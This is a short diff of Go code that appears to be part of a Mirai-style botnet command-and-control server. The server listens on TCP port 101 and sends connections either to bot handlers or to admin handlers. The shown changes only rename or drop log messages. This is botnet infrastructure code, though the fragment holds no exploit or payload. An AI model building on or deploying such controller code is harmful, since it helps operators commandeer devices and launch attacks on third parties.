@@ -22,7 +22,7 @@ func main() {
         return
     }
     
-    fmt.Println("This is creating the telnet connection")
+    fmt.Println("[LOG] Telnet connection opened")
 
     api, err := net.Listen("tcp", "0.0.0.0:101")
     if err != nil {
@@ -47,15 +47,12 @@ func main() {
         }
         go initialHandler(conn)
     }
-
-    fmt.Println("Stopped accepting clients")
 }
 
 func initialHandler(conn net.Conn) {
     defer conn.Close()
 
     conn.SetDeadline(time.Now().Add(10 * time.Second))
-    fmt.Println("Connection accepted")
 
     buf := make([]byte, 32)
     l, err := conn.Read(buf)
@@ -83,14 +80,14 @@ func initialHandler(conn net.Conn) {
                 }
                 source = string(source_buf)
             }
-            fmt.Println("New Bot connection")
+            fmt.Println("[BOT] New Bot accepted")
             NewBot(conn, buf[3], source).Handle()
         } else {
-            fmt.Println("New Bot connection 2")
+            fmt.Println("[BOT] New Bot accepted")
             NewBot(conn, buf[3], "").Handle()
         }
     } else {
-        fmt.Println("New Admin connection")
+        fmt.Println("[CLIENT] New Client accepted")
         NewAdmin(conn).Handle()
     }
 }
